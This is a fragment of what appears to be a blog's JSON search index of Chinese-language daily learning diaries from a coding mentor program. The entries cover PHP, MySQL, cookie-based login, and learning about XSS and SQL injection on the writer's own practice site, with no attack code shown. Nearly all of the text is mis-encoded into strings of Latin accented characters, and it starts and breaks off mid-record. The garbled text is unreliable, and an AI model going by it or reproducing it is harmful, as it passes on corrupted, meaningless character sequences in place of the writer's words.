çš„æŒ‡ä»¤é‚„ä¸æ˜¯å¾ˆç†Ÿï¼Œåƒ INSERT INTO è·Ÿ UPDATEï¼Œç¸½æœƒæéŒ¯ SET æ˜¯èª°å®¶çš„å°å­©ï¼Œé‚„æœ‰ &lt;column&gt; è¦ä¸è¦ç”¨ () åŒ…ä½ï¼Œå¸Œæœ›ä¹‹å¾Œå¯«ä¹…äº†æœƒè¶Šä¾†è¶Šç†Ÿæ‚‰å§ã€‚ ä»Šå¤©æœ€æœ‰è¶£çš„äº‹æƒ…æ˜¯å­¸åˆ°é€éã€Œè¡¨å–®ã€æºé€šçš„æ™‚å€™å¾Œç«¯åˆ°åº•éƒ½æ€éº¼è™•ç†è³‡æ–™çš„ï¼ŒåŸä¾†ä¹Ÿæ²’æœ‰é‚£éº¼è¤‡é›œï¼Œç¸½ä¹‹æ˜¯ä»¶å¾ˆé–‹å¿ƒçš„å­¸ç¿’æ—…ç¨‹ã€‚ é¡Œå¤–è©±å¸Œæœ›ä¸è«–æ™‚é–“éäº†å¤šä¹…ï¼Œæˆ‘éƒ½èƒ½åƒç¾åœ¨ä¸€æ¨£å–œæ­¡å¯«ç¨‹å¼é€™ä»¶äº‹ã€‚ æœŸè¨±æ˜å¤©ä¹Ÿè¦æ›´åŠªåŠ›ï¼Œå¸Œæœ›æŠŠå¾Œç«¯é€™å¡Šæ‹¼åœ–çµ¦æ‹šå®Œã€‚","link":"/2022/02/01/mentor-program-day50/"},{"title":"mentor-program-day51","text":"éå¹´ä¸å¥½è¶•é€²åº¦ã€‚ é€²åº¦é€™å¹¾å¤©å› ç‚ºéƒ½å»å¥³æœ‹å‹å®¶éå¹´ï¼Œæ‰€ä»¥åªæœ‰ç”¨æ‰‹æ©Ÿçœ‹çœ‹æ–‡ç« ä¾†å­¸ä»¥å‰æ²’æœ‰å¼„æ‡‚çš„ JS è§€å¿µï¼š function ä¸­çš„ call apply bind å­¸ hoisting ä¹‹å‰å…ˆç†è§£ EC æ˜¯ä»€éº¼ï¼Ÿ å­¸åˆ°çš„äº‹æƒ…é›–ç„¶è‡ªå·±è¦ºå¾—è½å¾Œäº†å¾ˆå¤šé€²åº¦ï¼Œä½†é‚„æ˜¯ç›¡é‡åˆ©ç”¨æ™‚é–“ä¾†å­¸ç¿’ã€‚æœ‰ä»¶è »é–‹å¿ƒçš„äº‹æƒ…æ˜¯çµ‚æ–¼æŠŠ æˆ‘çŸ¥é“ä½ æ‡‚ hoistingï¼Œå¯æ˜¯ä½ äº†è§£åˆ°å¤šæ·±ï¼Ÿ çš„å…§å®¹çµ¦çœ‹æ‡‚äº†ï¼ˆè‡³å°‘æœ‰ 90% å§ï¼‰ï¼Œä»¥å‰çœ‹åˆ° ECMAScript è¦æ ¼æ›¸çš„éƒ¨åˆ†å°±æ”¶æ‰‹äº†ï¼Œç•¢ç«Ÿã€Œç†è«–ã€çš„æ±è¥¿é›–ç„¶åš´è¬¹ï¼Œä½†ä¹Ÿç›¸å°ç¡¬ï¼Œåœ¨ JS åŸºç¤ä¸å¥½çš„æƒ…æ³ä¸‹è®€èµ·ä¾†æ˜¯è »åƒåŠ›çš„ã€‚ ä¸éåœ¨åƒåŠ äº†ç¨‹å¼å°å¸«è¨ˆç•«å¾Œï¼ŒJS åŸºç¤çš„éƒ¨åˆ†ä¸€æ­¥ä¸€æ­¥å»ºç«‹èµ·ä¾†ï¼Œæ‰€ä»¥ä¸çŸ¥ä¸è¦ºä¸­å°±èƒ½å¤ æŠŠä»¥å‰ä¸€ç›´çœ‹ä¸æ‡‚çš„æ±è¥¿çµ¦çœ‹æ‡‚äº†ï¼Œé€™æ˜¯æˆ‘è¦ºå¾—å¾ˆæœ‰æˆå°±æ„Ÿçš„åœ°æ–¹ã€‚ é¡Œå¤–è©±é›–ç„¶é€²åº¦è½å¾Œï¼Œä½†å¸Œæœ›é‚„æ˜¯è¦ç›¡é‡åˆ©ç”¨æ™‚é–“ã€‚ æœŸè¨±é€™å¹¾å¤©å¯èƒ½ä¸å¤ªæœ‰æ©Ÿæœƒè¶•é€²åº¦ï¼Œä½†é‚„æ˜¯ç›¡é‡åŠ æ²¹å§ï¼","link":"/2022/02/03/mentor-program-day51/"},{"title":"mentor-program-day52","text":"å¿«éå®Œçš„å¹´ã€‚ é€²åº¦ä¸€æ¨£æ˜¯é€²åº¦å°‘å°‘çš„ä¸€å¤©ï¼Œä»Šå¤©æŠŠè³‡æ–™åº«çš„ CRUD çµ¦è¤‡ç¿’å®Œç•¢ï¼š MySQL é€£ç·šåˆ°è³‡æ–™åº« MySQL è®€å–è³‡æ–™åº«ä¸­çš„è³‡æ–™ MySQL å»ºç«‹æ–°è³‡æ–™åˆ°è³‡æ–™åº« MySQL å¾è³‡æ–™åº«ä¸­åˆªé™¤è³‡æ–™ MySQL ä¿®æ”¹è³‡æ–™åº«ä¸­çš„è³‡æ–™ å­¸åˆ°çš„äº‹æƒ…æ„Ÿè¦ºå°è³‡æ–™åº«çš„æ“ä½œæœ‰æ¯”è¼ƒä¸Šæ‰‹é»äº†ï¼Œä¹Ÿé€æ¼¸ç¿’æ…£ PHP çš„èªæ³•äº†ï¼Œé‚„ä¸éŒ¯ã€‚ é¡Œå¤–è©±é€™ä¸–ç•Œæ˜¯é™¤äº†æ‡‚äºŒé€²ä½è·Ÿä¸æ‡‚äºŒé€²ä½çš„äººä»¥å¤–ï¼Œæˆ‘æƒ³é‚„æœ‰æ‡‚ç©ç‰Œè·Ÿä¸æœƒç©ç‰Œçš„äºº (ã¤Ğ´âŠ‚) æœŸè¨±å¸Œæœ›æ˜å¤©å¯ä»¥é–‹å§‹åš [BE101] çš„å¯¦æˆ°éƒ¨åˆ†ã€‚","link":"/2022/02/03/mentor-program-day52/"},{"title":"mentor-program-day53","text":"å¿«å…©å€‹æœˆäº†ã€‚ é€²åº¦ä»Šå¤©å»¶çºŒ [BE101] çš„å…§å®¹ï¼Œåšäº†ç¬¬ä¸€å€‹å¯¦æˆ°ç·´ç¿’ã€ŒJob è·ç¼ºå ±å ±ã€ï¼š å­¸åˆ°çš„äº‹æƒ…ç”¢å“æ§‹æƒ³æ˜¯ä¸€å€‹å¾ˆæœ‰è¶£çš„åœ°æ–¹ï¼Œä»¥å‰å¾æ²’åšéï¼Œé›–ç„¶åªæ˜¯å¾ˆç°¡å–®çš„æ§‹æƒ³ï¼Œä½†å¾ç„¡åˆ°æœ‰çš„éç¨‹å¾ˆæœ‰è¶£ã€‚ å°æ–¼å¾Œç«¯è·Ÿè³‡æ–™åº«çš„æºé€šä¹Ÿé€æ¼¸åœ¨ç·´ç¿’ä¸­è¶Šä¾†è¶Šç†Ÿæ‚‰ï¼Œä¸éä¹Ÿé–‹å§‹é«”æœƒåˆ° Huli èªªçš„ã€Œå¤§é›œç‡´ã€æ˜¯ä»€éº¼æ¦‚å¿µã€‚ç•¶æ±è¥¿è¶Šä¾†è¶Šå¤šçš„æ™‚å€™çµ•å°æ˜¯å¾ˆé›£ç¶­è­·çš„ï¼ŒæœŸå¾…ä¹‹å¾Œçš„èª²ç¨‹æœƒè§£é‡‹è©²å¦‚ä½•åˆ©ç”¨å·¥å…·è§£æ±ºå•é¡Œã€‚ é¡Œå¤–è©±é¬¼æ»…è¦å®Œçµå•¦ï½ æœŸè¨±å¸Œæœ›æ˜å¤©æŠŠè·ç¼ºå ±å ±çš„æœ€å¾Œéƒ¨åˆ†åšå®Œï¼Œæ¥è‘—é€²åˆ°ä¸‹ä¸€å€‹å¯¦æˆ°ï¼šéƒ¨è½æ ¼","link":"/2022/02/05/mentor-program-day53/"},{"title":"mentor-program-day54","text":"æœ€å¾Œä¸€å¤©çš„æ–°å¹´å¿«æ¨‚ã€‚ é€²åº¦ä»Šå¤©ä¸€æ¨£åš [BE101] çš„å¯¦æˆ°ç·´ç¿’ã€Œéƒ¨è½æ ¼ã€ã€‚ å¾Œå°ä¹Ÿåšçš„å·®ä¸å¤šäº†ï¼Œåªå‰©æœ€å¾Œçš„èª¿æ•´å°±èƒ½å®Œæˆã€‚ å­¸åˆ°çš„äº‹æƒ…é›–ç„¶æœ€ä¸»è¦çš„å¯¦æˆ°ç·´ç¿’æ˜¯ã€Œç•™è¨€æ¿ã€ï¼Œä½†å¾é€™å…©å€‹å¯¦æˆ°è£¡æˆ‘ä¹Ÿå­¸åˆ°äº†è »å¤šæ±è¥¿ï¼Œä¹Ÿå°ä¸€å€‹ç¶²ç«™çš„å‰å¾Œå°æ›´åŠ ç†Ÿæ‚‰ã€‚ç¾åœ¨çš„ code ç¢ºå¯¦å¾ˆé«’å¾ˆäº‚ï¼Œä¸éç›¸ä¿¡åœ¨æ¥ä¸‹ä¾†çš„èª²ç¨‹è£¡æœƒä¸€ä¸€æ‰¾å‡ºè§£æ±ºè¾¦æ³•å§ã€‚ å¦å¤–ä¹Ÿå°ä¸€äº›äº‹æƒ…ç”¢ç”Ÿæ„Ÿè§¸ï¼Œåœ¨æˆ‘é‚„ä¸æ‡‚å¾Œç«¯æ™‚ï¼Œæˆ‘è¦ºå¾—å¯«å¾Œç«¯çš„äººçœŸå²å®³ï¼Œèƒ½åšå‡ºæˆ‘ä¸æœƒçš„å¾Œå°ç®¡ç†è·Ÿè³‡æ–™åº«ä¸²æ¥ï¼Œä½†ç•¶æˆ‘å­¸äº†å¾Œç«¯ä¹‹å¾Œï¼Œæ‰æ„è­˜åˆ°ç‚ºä»€éº¼å¾Œç«¯å·¥ç¨‹å¸«ä¹Ÿæœƒå´‡æ‹œå‰ç«¯å·¥ç¨‹å¸«ã€‚ ä¸ç®¡æ˜¯ç©ºæœ‰åŠŸèƒ½é‚„æ˜¯ç©ºæœ‰ç•«é¢ï¼Œå…©è€…éƒ½å¿…é ˆäº’ç›¸é…åˆã€‚ç©ºæœ‰ç•«é¢æ²’æœ‰åŠŸèƒ½ï¼Œé‚„æ˜¯ç©ºæœ‰åŠŸèƒ½ä½†å»æ²’æœ‰ç•«é¢éƒ½æ˜¯ä¸è¡Œçš„ï¼Œå°‘äº†å…¶ä¸­ä¸€å€‹å°±æœƒå•é¡Œå¾ˆå¤§ï¼Œä¹Ÿè®“äººç”¨ä¸ä¸‹å»ã€‚ æ‰€ä»¥ç•¶å¤§å®¶åœ¨çˆ­è«–ã€Œå‰ç«¯è·Ÿå¾Œç«¯èª°æ¯”è¼ƒå²å®³ã€çš„æ™‚å€™ï¼Œæˆ‘æœƒè¦ºå¾—æ²’æœ‰å¿…è¦çˆ­é€™å€‹ï¼Œä¸è«–æ˜¯å‰ç«¯é‚„æ˜¯å¾Œç«¯ï¼Œåœ¨ç¶²é çš„ä¸–ç•Œè£¡éƒ½æ˜¯å¾ˆé‡è¦çš„è§’è‰²ï¼Œæ²’æœ‰èª°æ¯”è¼ƒå²å®³èª°æ¯”è¼ƒä½åŠ£é€™å›äº‹ã€‚ é¡Œå¤–è©±ä»Šå¤©å°±èƒ½çœ‹åˆ°é¬¼æ»…äº†ï½ æœŸè¨±å¸Œæœ›æ˜å¤©æŠŠéƒ¨è½æ ¼åšå®Œï¼Œæ­£å¼é€²åˆ°çœŸæ­£çš„ç•™è¨€æ¿å¯¦æˆ°ã€‚","link":"/2022/02/06/mentor-program-day54/"},{"title":"mentor-program-day55","text":"é–‹å·¥å›‰ã€‚ é€²åº¦ä»Šå¤©æŠŠã€Œéƒ¨è½æ ¼ã€å¯¦æˆ°ç·´ç¿’çµ¦åšå®Œæ•´ï¼Œæ¥è‘—å°±åšä¸‹ä¸€å€‹å¯¦æˆ°ç·´ç¿’ã€Œç•™è¨€æ¿ã€ã€‚ ç›®å‰åšäº†æœ€åŸºæœ¬çš„åŠŸèƒ½ï¼š ç™¼ä½ˆç•™è¨€ è¨»å†ŠåŠŸèƒ½ ç™»å…¥åŠŸèƒ½ å­¸åˆ°çš„äº‹æƒ…ç•™è¨€ç‰ˆæ˜¯æ‰€æœ‰å¯¦æˆ°ç·´ç¿’è£¡é¢æœ€æœ‰è¶£çš„ä¸€å€‹ï¼Œä¹ŸçœŸçš„å­¸åˆ°äº†ã€ŒCookie è©²æ€éº¼ç”¨ã€é€™ä»¶äº‹ã€‚ä»¥å‰éƒ½è¦ºå¾—ç™»å…¥åŠŸèƒ½è½èµ·ä¾†è »è¤‡é›œçš„ï¼Œä½†å¯¦éš›åšä¹‹å¾Œæ‰ç™¼ç¾ä¹Ÿæ²’é‚£éº¼è¤‡é›œï¼Ÿä¹‹å¾Œä¹Ÿæƒ³å»å˜—è©¦å„ç¨®æ±è¥¿ï¼Œå¸Œæœ›èƒ½æŠŠä»¥å‰æƒ³å­¸ä½†æ²’å­¸éçš„æ±è¥¿çµ¦å­¸èµ·ä¾†ã€‚ å¦å¤–ä¹Ÿé«”æœƒåˆ°ã€Œåœ¨å‰ç«¯å¯«ç¶²é ã€è·Ÿã€Œåœ¨å¾Œç«¯å¯«ç¶²é ã€çš„å·®ç•°ï¼Œåœ¨å‰ç«¯çš„ä¸–ç•Œè£¡ä¸€åˆ‡éƒ½æ˜¯éœæ…‹çš„ï¼ˆæ²’æœ‰æ‰¯åˆ°ç¶²è·¯çš„è©±ï¼‰ï¼Œä½†åœ¨å¾Œç«¯çš„ä¸–ç•Œè£¡å»éƒ½æ˜¯å‹•æ…‹çš„ï¼ˆå› ç‚ºè¦è·Ÿè³‡æ–™åº«é€£çµï¼‰ã€‚é‚„æœ‰ä¸€é»å¾ˆç‰¹åˆ¥çš„æ˜¯åœ¨å¾Œç«¯è¦åšã€Œé©—è­‰ã€å¯ä»¥ç”¨ Location å¸¶ GET åƒæ•¸ä¾†å–å¾—è³‡è¨Šé€™é»å¾ˆæœ‰è¶£ã€‚ åªæ˜¯æƒ³èªªå…©ç¨®ä¸åŒçš„æ„Ÿè¦ºè »æœ‰æ„æ€çš„ï¼Œå› ç‚ºæ˜¯ä¸€ç¨®æ–°çš„é«”é©—å§ï¼Ÿæˆ‘ä¹Ÿä¸çŸ¥é“è©²æ€éº¼èªªï½ é¡Œå¤–è©±åŸä¾†é¬¼æ»…é‚„æœ‰ç¬¬ 11 é›†å‘€ï¼Œå¤ªé©šäººäº†ï¼Œæ»¿æ»¿çš„ç¶“è²»ç‡ƒç‡’ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©æŠŠ [BE101] çœ‹åˆ°æŒ‡å®šæ®µè½ï¼Œä¹Ÿå¸Œæœ›ç•™è¨€æ¿è®Šå¾—è¶Šä¾†è¶Šå¼·å¤§ã€‚","link":"/2022/02/07/mentor-program-day55/"},{"title":"mentor-program-day56","text":"ä¸çŸ¥ä¸è¦ºå…©å€‹æœˆå¿«éå»äº†ã€‚ é€²åº¦ä»Šå¤©ç¹¼çºŒåšç•™è¨€æ¿çš„éƒ¨åˆ†ï¼Œä¸»è¦æ˜¯å°èƒŒå¾Œçš„ code åšå„ªåŒ–ï¼Œåƒæ˜¯æŠŠ session æ”¹æˆç”¨ PHP çš„å…§å»ºæ–¹æ³•ï¼Œé‚„æœ‰ä¸€äº›å¯ä»¥åŒ…è£æˆ function çš„ç‰‡æ®µç­‰ç­‰ã€‚ é›–ç„¶å·²ç¶“æŠŠ [BE101] çœ‹åˆ°æŒ‡å®šçš„æ®µè½äº†ï¼Œä½†å‡ºæ–¼å¥½å¥‡ï¼Œæ‰€ä»¥æ¥ä¸‹ä¾†çš„æ™‚é–“éƒ½åœ¨çœ‹å¾Œé¢çš„å½±ç‰‡ï¼Œä¹Ÿèªè­˜äº†å¾ˆå¤šç›®å‰ç•™è¨€ç‰ˆçš„æ¼æ´ï¼Œé§­å®¢æœƒæ€éº¼æ”»æ“Šä¹‹é¡çš„ã€‚ä¸ééƒ½é‚„æ²’æœ‰è‡ªå·±å¯¦ä½œéï¼Œå› ç‚ºçªç„¶æ„Ÿåˆ°ç‰¹åˆ¥ç–²å€¦ï¼Œä¸çŸ¥é“ç‚ºä»€éº¼ã€‚ç¸½ä¹‹å¸Œæœ›æ˜å¤©èƒ½æ‰“èµ·ç²¾ç¥ä¾†å§ï¼ å­¸åˆ°çš„äº‹æƒ…å°±è·Ÿé€²åº¦æåˆ°çš„å·®ä¸å¤šï¼Œé™¤äº†æ›´èªè­˜äº† session ã€Œæ©Ÿåˆ¶ã€ä»¥å¤–ï¼ˆåˆæˆ–è€…æ˜¯èªªã€Œä¸Šä¸‹æ–‡ã€ï¼‰ï¼Œä¹Ÿèªè­˜äº†ä»€éº¼æ˜¯ XSS è·Ÿ SQL Injectionï¼Œé§­å®¢æœƒæ€éº¼æ”»æ“Šä½ çš„ç¶²ç«™é€™æ¨£å­ã€‚å¦‚æœæ—©ä¸€é»å­¸ç¨‹å¼çš„è©±èªªä¸å®šæˆ‘ä¹Ÿèƒ½ç•¶é§­å®¢ï¼Ÿ é¡Œå¤–è©±ä¸ç®¡æ˜¯å¾äº‹ä»€éº¼è·æ¥­ï¼Œäººå¥½åƒéƒ½æœƒé¢è‡¨ä¸€æ®µä½æ½®æœŸã€‚åƒæˆ‘ç¸½æ˜¯æœƒæœ‰æ®µæ™‚é–“æ„Ÿåˆ°æ²’ä»€éº¼å‹•åŠ›ï¼Œä¹Ÿæœƒå¦å®šè‡ªå·±çš„èƒ½åŠ›ã€‚è©²æ€éº¼è®“è‡ªå·±æ‰“èµ·ç²¾ç¥ä¾†ï¼Œé€™å€‹ç­”æ¡ˆæœ‰æ™‚å€™ä¹ŸæŒºæ¨¡ç³Šçš„ã€‚ ä¹Ÿè¨±ä»Šå¤© A æœƒè¦ºå¾—æˆ‘é€²æ­¥å¾ˆå¤šå‘€ï¼Œè¦æˆ‘ç¹¼çºŒåŠ æ²¹ï¼Œä¸è¦æ°£é¤’ï¼›ä½†åŒæ™‚ä¹Ÿæœƒæœ‰ B è¦ºå¾—æˆ‘æ€éº¼é‚„åœç•™åœ¨é€™è£¡ï¼Œéƒ½åœ¨åšä»€éº¼ï¼Ÿé€™ç¨®çŸ›ç›¾çš„å¿ƒæƒ…æœ‰æ™‚å€™è‡ªå·±ä¹Ÿå¾ˆé›£è§£é‡‹ï¼Œä¸çŸ¥é“è‡ªå·±åˆ°åº•è™•åœ¨å“ªå€‹é‚Šç•Œä¸Šï¼Œæ‰€ä»¥å°±æœƒæ„Ÿåˆ°å¤±è½ã€‚ ç¸½ä¹‹ï¼Œé‚„æ˜¯è¦æ‰“èµ·ç²¾ç¥ä¾†çš„å°å§ï¼Œé›–ç„¶è¦å­¸ç¿’çš„æ±è¥¿æœƒè®Šå¾—è¶Šä¾†è¶Šè¤‡é›œï¼Œä½†æˆ‘ä¾ç„¶ç›¸ä¿¡ä¸€æ­¥ä¸€æ­¥ä¾†ç¸½èƒ½å¤ å­¸æœƒè·Ÿåšå¥½çš„ã€‚é›–ç„¶é‚„ä¸çŸ¥é“è‡ªå·±çš„æœªä¾†æœƒè®Šå¾—æ€éº¼æ¨£ï¼Œä½†æˆ‘é‚„æ˜¯æƒ³ç›¡åŠ›å»æŠŠé€™ä»½è¨ˆç•«åšåˆ°æœ€å¥½ï¼Œè®Šæˆè‡ªå·±å¿ƒç›®ä¸­çš„é‚£å‰¯æ¨¡æ¨£ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©æŠŠ [BE101] çš„éƒ¨åˆ†çœ‹å®Œï¼Œæ¥è‘—å¯èƒ½æœƒæŠŠç•™è¨€æ¿é‡é ­ä¾†éï¼Œçœ‹è‡ªå·±èƒ½ä¸èƒ½å¾é›¶é–‹å§‹åšå‡ºä¾†ã€‚ è€å¯¦èªªé€™æ˜¯æœ€éº»ç…©çš„éƒ¨åˆ†ï¼Œä½†é€™ä¹Ÿè¨±æ˜¯æª¢é©—è‡ªå·±çš„æœ€å¥½è¾¦æ³•å§ï¼Ÿ","link":"/2022/02/08/mentor-program-day56/"},{"title":"mentor-program-day57","text":"How far Iâ€™ll go. é€²åº¦ä»Šå¤©æŠŠå¾ç•™è¨€æ¿å­¸åˆ°çš„çŸ¥è­˜åšäº†ç­†è¨˜ï¼Œä¹Ÿé–‹å§‹è™•ç†å®‰å…¨æ€§çš„å•é¡Œï¼Œåƒæ˜¯å¯†ç¢¼ä¸èƒ½å­˜æ˜ç¢¼ä¹‹é¡çš„ã€‚ ä¸€æ¨£é™„ä¸Šä»Šå¤©åšçš„ç­†è¨˜ï¼š åˆ©ç”¨ Cookie å¯¦ä½œç™»å…¥æ©Ÿåˆ¶ ç•¶ Cookie è¢«ç«„æ”¹æœƒæ€éº¼æ¨£ï¼Ÿ Encodeã€Encrypt è·Ÿ Hash çš„å·®åˆ¥ åšç­†è¨˜ç¸½æ˜¯æ¯”è¼ƒèŠ±æ™‚é–“å‘€ã€‚ä½†åšç­†è¨˜çš„å¥½è™•æ˜¯ä¸æœƒéä¸€æ®µæ™‚é–“ä¹‹å¾Œå°±å¿˜è¨˜ä»¥å‰å­¸éçš„çŸ¥è­˜ï¼Œæœƒæ¯”è¼ƒåˆ»å°åœ¨è…¦æµ·è£¡çš„æ„Ÿè¦ºï¼Œæ‰€ä»¥é‚„æ˜¯è »å–œæ­¡åšç­†è¨˜çš„ã€‚ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©ä¸»è¦æ˜¯è¤‡ç¿’æ€éº¼é€é Cookie ä¾†å»ºç«‹ Session çš„è§€å¿µã€‚é€™å€‹éƒ¨ä»½æ„Ÿè¦ºè »é‡è¦çš„ï¼Œæ‰€ä»¥å¸Œæœ›èƒ½å¼„ç†Ÿï¼Œä¸è¦åªæ˜¯è‰è‰å¸¶éã€‚ å¦å¤–ä¹Ÿåœ¨ [BE101] å­¸åˆ°äº†è »æœ‰è¶£çš„æ”»æ“Šæ–¹å¼ã€‚ä»¥å‰æˆ‘åªå¾æ›¸ä¸Šå­¸åˆ° XSS å¯ä»¥å· Cookieï¼Œä¸çŸ¥é“åŸä¾†é‚„å¯ä»¥æŠŠä½¿ç”¨è€…å¸¶åˆ°é‡£é­šç¶²ç«™ï¼Œé‚„æœ‰å„ç¨®å¥‡è‘©é‚ªæƒ¡çš„äº‹æƒ…ï¼Œæ€ªä¸å¾—æœ‰äº›é§­å®¢èƒ½å¤ å¾ä¸­æ‰¾åˆ°æ¨‚è¶£ï¼Œä¹Ÿä¸æ˜¯ä¸èƒ½ç†è§£å•¦ã€‚ é¡Œå¤–è©±ï¼šå…¶å¯¦ä»¥å‰çœ‹æ›¸å­¸ XSS æ™‚ï¼Œå› ç‚ºç¯„ä¾‹å¯¦åœ¨å¤ªéç²¾ç°¡ï¼Œåªæœ‰ä¸€è¡Œç¨‹å¼ç¢¼çš„é‚£ç¨®ï¼Œå°è‡´æˆ‘æ ¹æœ¬æ²’ææ‡‚é‚£å€’åº•åœ¨åšå•¥ã€‚ä½†æœ‰äº†ç›´æ¥å±•ç¤ºåœ¨çœ¼å‰çš„ç¯„ä¾‹å¾Œå°±é¦¬ä¸Šç†è§£äº†ï¼Œä¹Ÿè¨±é€™å°±æ˜¯æ•™å­¸å½±ç‰‡èƒ½å¤ è¶…è¶Šæ›¸æœ¬çš„åœ°æ–¹å§ï¼Œä¸€å€‹æœ‰æ„Ÿè€Œç™¼çš„é¡Œå¤–è©±ã€‚ è‡³æ–¼ SQL Injection å°±è·Ÿ XSS çš„æ”»æ“Šæ–¹å¼å·®ä¸å¤šï¼Œæˆ‘åªèƒ½èªªï¼š æ‰è¯æ´‹æº¢ æˆ‘æ˜¯èªªâ€¦è«‹æŠŠæ‰è¯ç”¨åœ¨æ­£ç¢ºçš„åœ°æ–¹ã€‚ é¡Œå¤–è©±æ™‚é–“éå¾—å¾ˆå¿«ï¼Œæœ‰æ™‚å€™æœƒæ“”å¿ƒè‡ªå·±æŠ•å…¥å¤ªå¤šæ™‚é–“åœ¨å­¸ç¿’ä¸Šï¼ŒçŠ§ç‰²äº†è·Ÿå¥³æœ‹å‹ç›¸è™•çš„æ™‚é–“ï¼Œé€™ç¨®å¿ƒæƒ…é‚„æŒºè¤‡é›œçš„ã€‚å¯æ˜¯é‚„æ˜¯æœƒå‘Šè¨´è‡ªå·±è¦å …æŒä¸‹å»ï¼Œç›¸ä¿¡ç•¶æœªä¾†æ—¥å­æ”¹è®Šå¾Œï¼Œç›¸è™•çš„æ™‚é–“å°±èƒ½å¢åŠ ã€‚ é‚„æ˜¯è€æ¨£å­ï¼Œå¸Œæœ›ä¸€åˆ‡é †åˆ©ï¼Œäººç”Ÿæœ‰è¶£ï¼ˆæƒ¡æ„ï¼‰çš„åœ°æ–¹å°±æ˜¯æ°¸é ä¸çŸ¥é“ä¸‹ä¸€ç§’æœƒç™¼ç”Ÿä»€éº¼ã€‚ è¨±é¡˜æ± ï¼ˆå·å·çš„æ¨™é¡Œå¾æœŸè¨±æ”¹æˆè¨±é¡˜æ± ï¼Œå› ç‚ºé€™æ¨£æ›´æœ‰æ„å¢ƒâ€¦å§ï¼Ÿï¼‰ å¸Œæœ›æ˜å¤©æŠŠ [BE101] çœ‹åˆ°æˆ‘æƒ³çœ‹çš„æ®µè½ï¼Œç„¶å¾Œè¶•å¿«æŠŠç¬¬ä¹é€±çš„ä»»å‹™å®Œæˆã€‚","link":"/2022/02/09/mentor-program-day57/"},{"title":"mentor-program-day58","text":"åŠªåŠ›è¶•é€²åº¦ é€²åº¦ä»Šå¤©ä¸€æ¨£ä¿®æ­£ç•™è¨€æ¿çš„å•é¡Œï¼Œå­¸æœƒæ€éº¼æ”»æ“Šè·Ÿé˜²å®ˆï¼š å¾ç©å£è‡ªå·±çš„ç¶²ç«™ä¾†å­¸ç¿’ XSS ç”¨ SQL Injection ä¾†ç©å£è³‡æ–™åº« ç¸½ç®—æ˜¯æŠŠé€™éƒ¨åˆ†çµ¦å®Œæˆäº†ï¼Œæ˜å¤©è¦ä¾†é‡é ­ä¾†éã€‚ å­¸åˆ°çš„äº‹æƒ…å¦‚ä¸Šæ‰€èªªï¼Œå¯«ç¨‹å¼å°±åƒè§’è‰²æ‰®æ¼”ä¸€æ¨£ï¼Œåªæœƒæ”»æ“Šæˆ–é˜²å®ˆçš„è©±æ˜¯ä¸å¤ çš„ï¼Œå¿…é ˆå…©è€…å…¼å…·æ‰èƒ½æˆç‚ºå²å®³çš„äººã€‚ ä»Šå¤©æœ€æœ‰è¶£çš„åœ°æ–¹æ˜¯æŠŠå· Cookie çš„æ–¹æ³•å¯¦ä½œå‡ºä¾†äº†ï¼Œä»¥å‰éƒ½åªæ˜¯è½åˆ¥äººèªªä½†æ²’æœ‰è‡ªå·±åšéï¼Œåšå®Œå¾Œç™¼ç¾ä¹Ÿæ²’æœ‰é‚£éº¼è¤‡é›œï¼ŒçœŸæ­£é›£çš„åœ°æ–¹æ˜¯èƒ½å¤ ã€Œæƒ³å‡ºé€™ç¨®æ–¹å¼ã€ï¼Œæˆ‘æ˜¯é€™æ¨£æƒ³çš„ã€‚ åšç•™è¨€æ¿çš„é€™å¹¾å¤©ï¼Œé«”æœƒåˆ°ä»€éº¼å«åšé­”é¬¼è—åœ¨ç´°ç¯€è£¡ã€‚ä¸€å€‹ç¶²ç«™çš„å®‰å…¨æ€§èˆ‡æ¼æ´ï¼Œæ˜¯ä»¥å‰çš„æˆ‘ä¸æœƒå»è€ƒæ…®çš„äº‹æƒ…ï¼Œåªæœƒæƒ³è‘—æ±è¥¿åšå‡ºä¾†å°±å¥½äº†ã€‚ä½†æ˜¯ä¸æ˜¯é€™æ¨£å­ï¼Œç•¶å¯¦éš›å»æ€è€ƒé§­å®¢æœƒæ€éº¼æ”»æ“Šï¼Œè¦æ€éº¼æ‡‰å°æ™‚ï¼Œæ‰æœƒç™¼ç¾èƒŒå¾Œè¦åšçš„è™•ç†çœŸçš„å¾ˆå¤šï¼Œä¸€å€‹ä¸å°å¿ƒå°±æœƒå‡¸æ§Œæˆ–ã„…ã„§ã„šË‹åº·ï¼Œåªèƒ½èªªè³‡å®‰çœŸçš„æ˜¯å€‹å¾ˆæœ‰æŒ‘æˆ°æ€§çš„è·æ¥­ã€‚ é¡Œå¤–è©± The more you gain by pretending, the less youâ€™re actually gonna have. é›–ç„¶é€™æ˜¯ä¸€æ®µè½èµ·ä¾†å¾ˆæœ‰é“ç†çš„è©±ï¼Œä½†ç¸½è¦ºå¾—å¾ç¾å¯¦çœ‹åˆ°çš„ä¸¦ä¸æ˜¯é€™æ¨£å­ã€‚ å¦‚æœæˆ‘ä¹Ÿæœ‰ç¥ç‡ˆçš„è©±ï¼Œæˆ‘æœƒè¨±é¡˜ï¼Œè·Ÿå¥³æœ‹å‹ä¸€èµ·éè‘—å¹³å‡¡çš„ç”Ÿæ´»ï¼Œä¸éœ€è¦æ¦®è¯å¯Œè²´çš„ä¸€åˆ‡ï¼Œåªéœ€è¦é›™æ–¹é™ªä¼´å½¼æ­¤çš„å¿ƒã€‚ è¨±é¡˜æ± æ˜å¤©è¦ä¾†åš week9 çš„ä½œæ¥­ï¼ŒæŠŠç•™è¨€æ¿é‡é ­ä¾†éï¼Œå¸Œæœ›èƒ½è¶•å¿«é€²åˆ°å¾Œé¢çš„é€²åº¦ã€‚","link":"/2022/02/10/mentor-program-day58/"},{"title":"mentor-program-day59","text":"ç¹¼çºŒè¡è¡è¡ï½ é€²åº¦ä»Šå¤©æŠŠç•™è¨€æ¿åˆé‡åšäº†ä¸€éï¼Œæ²’æœ‰èŠ±å¾ˆå¤šæ™‚é–“å°±åšå®Œäº†ã€‚æ¥è‘—å°±åšè‡ªæˆ‘æª¢è¨ï¼Œä¹Ÿæœ‰åƒè€ƒå…¶ä»–åŒå­¸å¯«çš„ä½œæ¥­ã€‚ é€™é€±çš„ä½œæ¥­å°±æ˜¯è¤‡ç¿’ä¸Šèª²çš„å¯¦ä½œå…§å®¹ï¼Œæ‰€ä»¥é‚„è 